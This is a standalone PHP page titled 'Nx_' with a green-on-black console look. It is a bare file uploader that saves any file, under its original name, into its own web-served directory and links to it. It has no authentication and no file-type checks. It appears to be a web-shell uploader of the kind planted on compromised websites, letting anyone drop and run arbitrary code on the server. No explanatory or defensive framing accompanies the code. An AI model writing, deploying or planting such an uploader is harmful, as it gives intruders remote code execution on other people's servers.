<!DOCTYPE html><html><head><title>Nx_</title>
<style>
body{background:#111;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.b{background:#1a1a1a;border:1px solid #0f0;padding:30px;border-radius:8px;text-align:center;width:420px}
h2{color:#0f0;margin-bottom:20px}
input[type=file]{color:#0f0;margin:10px 0}
input[type=submit]{background:#0f0;color:#111;border:none;padding:10px 30px;cursor:pointer;font-weight:bold;font-family:monospace;font-size:14px}
.m{margin-top:15px;padding:10px;border:1px solid #0f0;background:#0a0a0a}
</style></head>
<body><div class='b'><h2>Nx_</h2>
<?php
if(isset($_FILES['f'])&&$_FILES['f']['error']===0){
$n=basename($_FILES['f']['name']);
$t=__DIR__.'/'.$n;
if(move_uploaded_file($_FILES['f']['tmp_name'],$t)){
echo '<div class="m">OK: <a href="/'.$n.'" style="color:#0f0">'.$n.'</a></div>';
}else{echo '<div class="m" style="border-color:red;color:red">FAIL</div>';}
}
?>
<form method='POST' enctype='multipart/form-data'>
<input type='hidden' name='k' value='<?=$sig?>'>
<input type='file' name='f'><br><br>
<input type='submit' value='UPLOAD'>
</form></div></body></html>
